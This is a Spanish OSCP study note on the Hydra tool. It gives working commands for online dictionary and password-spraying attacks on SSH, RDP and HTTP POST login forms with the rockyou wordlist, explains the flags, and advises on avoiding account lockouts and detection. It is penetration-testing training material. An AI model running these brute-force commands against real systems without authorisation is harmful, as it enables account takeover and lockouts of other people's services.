---
tipo: tecnica
fase: explotacion
so: multi
tags: [oscp, tecnica, explotacion, password]
fecha: 2026-10-05
---

# Hydra

> [!abstract] Qué es y cuándo usarla
> Ataques de **diccionario/spraying online** contra logins de servicios de red (SSH, RDP, FTP, SMB...) y formularios **HTTP POST**. Es un ataque **contra el servicio** → hace ruido y puede **bloquear cuentas**. Úsala cuando tengas un login expuesto y (idealmente) un usuario conocido o un password para rociar.

## Requisitos previos
```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz     # descomprimir rockyou (14M passwords)
sudo nmap -sV -p 2222 <IP>                            # confirmar servicio/puerto antes de atacar
```

## Pasos
```bash
# SSH - diccionario a un usuario (-l), puerto no estándar (-s)
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<IP>

# RDP - password spraying: 1 password (-p) contra lista de usuarios (-L)
echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://<IP>

# HTTP POST login form
hydra -l user -P /usr/share/wordlists/rockyou.txt <IP> \
  http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

| Flag / parte | Qué hace |
|---|---|
| `-l` / `-L` | Un usuario / lista de usuarios |
| `-p` / `-P` | Un password / lista de passwords |
| `-s <puerto>` | Puerto (servicio en puerto no estándar) |
| `http-post-form "A:B:C"` | A=ruta del form; B=body con `^USER^`/`^PASS^`; C=**string de fallo** |

> [!tip] Para HTTP POST necesitas 2 cosas: el **body del POST** (captúralo con Burp) y el **mensaje de fallo** (míralo en el navegador). **Acorta** el string de fallo y evita `password`/`username` para no dar falsos positivos.

> [!warning] Detección / problemas
> - **Ruido** máximo: logs, eventos, posible **lockout** (3 intentos → cuenta bloqueada) en producción. **Enumera antes**.
> - **Spraying** (1 password, muchos users) minimiza el riesgo de lockout.
> - WAF / **fail2ban** bloquean rápido en servicios web; los forms web suelen tener menos protección.
> - En ejercicios no debería tardar **>3 min**; si tarda, revisa comando o cambia de enfoque.

## Visto en
- Módulo: [[16 - Password Attacks]]
- Relacionado: [[Password Cracking (Hashcat y John)]] (ataque offline alternativo)
- Máquinas: [[]]
